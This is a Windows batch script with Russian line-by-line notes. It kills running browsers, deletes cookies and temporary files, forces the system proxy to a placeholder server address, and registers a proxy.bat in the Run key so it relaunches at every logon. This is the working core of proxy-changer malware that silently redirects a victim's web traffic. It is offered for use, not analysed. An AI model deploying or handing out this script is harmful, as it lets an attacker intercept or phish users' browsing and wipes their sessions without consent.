taskkill /f /im browser.exe &
taskkill /f /im iexplore.exe & 
taskkill /f /im chrome.exe & 
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 & 
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2 & 
REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Proxy /d "C:\Windows\proxy.bat" /t REG_SZ /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /d 0x00000001 /t REG_DWORD /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /d XXX.XXX.XXX.XXX:XXXX /t REG_SZ /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyOverride /d "<local>" /t REG_SZ /f

taskkill - завершение процесса
/f - принудительное завершение процесса
/im образ - имя образа, которое надо завершить (/im browser.exe, /im iexplore.exe, /im chrome.exe)
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 - Delete Temporary Internet Files
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2 -Delete Cookies
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1 - Delete History
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16 - Delete Form Data
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32 - Delete Passwords
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255 - Delete All
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 4351 - Delete All + files and settings stored by Add-ons
REG ADD - добавить в раздел реестра запись
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" - путь к разделу реестра
/v Proxy - имя переменной
/d 0x00000001 - значение переменной
/t REG_SZ - тип переменной
/f - добавить в рееестр без подтверждения
REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Proxy /d "C:\Windows\proxy.bat" /t REG_SZ /f - автозапуск скрипта после входа в систему
